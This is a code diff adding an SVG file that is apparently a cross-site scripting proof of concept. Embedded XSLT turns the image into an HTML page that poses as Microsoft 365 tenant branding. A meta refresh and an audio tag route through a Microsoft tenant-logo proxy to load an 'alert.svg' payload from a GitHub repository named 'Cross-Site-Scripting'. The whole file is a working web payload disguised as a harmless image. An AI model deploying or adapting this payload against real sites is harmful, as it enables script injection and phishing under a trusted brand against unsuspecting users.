@@ -1,0 +1,15 @@
+<?xml version="1.0"?>
+<?xml-stylesheet type="text/xsl" href="#stylesheet"?>
+<!DOCTYPE svg [<!ATTLIST xsl:stylesheet id ID #REQUIRED>]>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:stylesheet id="stylesheet" version="1.0">
+<xsl:output method="html"/>
+<xsl:template match="/">
+<html><head>
+<meta http-equiv="refresh" content="5;url=https://m365.cloud.microsoft/resources/tenant-logo-proxy?url=https%3A%2F%2Fraw.githubusercontent.com%2Fa-n-e-e-s%2FCross-Site-Scripting%2Frefs%2Fheads%2Fmain%2Falert.svg%3Fdeclfetch%3Dmedia-20260820"/>
+<title>Microsoft 365</title>
+</head><body style="font-family:sans-serif;background:#0f6cbd;color:white;text-align:center;padding-top:100px">
+<audio preload="auto" src="https://m365.cloud.microsoft/resources/tenant-logo-proxy?url=https%3A%2F%2Fraw.githubusercontent.com%2Fa-n-e-e-s%2FCross-Site-Scripting%2Frefs%2Fheads%2Fmain%2Falert.svg%3Fdeclfetch%3Dmedia-20260820"></audio>
+<h1>Loading Microsoft 365 tenant branding…</h1><p>Media cache test</p>
+</body></html>
+</xsl:template></xsl:stylesheet></svg>
